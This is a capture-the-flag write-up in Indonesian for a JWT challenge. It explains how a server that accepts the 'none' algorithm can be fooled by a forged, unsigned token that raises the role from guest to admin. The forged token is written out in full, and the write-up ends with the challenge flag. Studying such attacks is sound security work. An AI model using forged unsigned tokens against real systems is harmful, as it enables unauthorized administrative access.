# Jay. W. Tee Writeup

Challenge ini adalah tentang eksploitasi JWT (JSON Web Token). Website ini mengizinkan siapa saja untuk login dengan username/password apa pun, dan memberikan token JWT sebagai bukti autentikasi.

## Analysis

Setelah login, kita mendapatkan cookie `token` yang berisi JWT. Format JWT adalah `header.payload.signature`.
Header yang kita dapatkan:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
Payload yang kita dapatkan:
```json
{
  "username": "guest",
  "role": "guest"
}
```

Halaman `/admin` hanya bisa diakses oleh user dengan `role: admin`. Karena ini adalah challenge JWT, teknik pertama yang patut dicoba adalah **None Algorithm Attack**.

## Vulnerability

Vulnerability terjadi karena server menerima JWT dengan algoritma `none`. Algoritma ini memberi tahu server bahwa token tidak memiliki signature, sehingga server tidak akan memverifikasi keaslian token tersebut.

## Exploitation

Kita bisa membuat token baru dengan:
1. Header: `{"alg":"none","typ":"JWT"}` di-base64 menjadi `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
2. Payload: `{"username":"guest","role":"admin"}` di-base64 menjadi `eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6ImFkbWluIn0`
3. Signature: Kosong.

Token akhirnya menjadi: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6ImFkbWluIn0.` (ingat titik di akhir).

Setelah mengirim request ke `/admin` dengan token tersebut, server memberikan flag.

## Flag
<FLAG>boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}</FLAG>
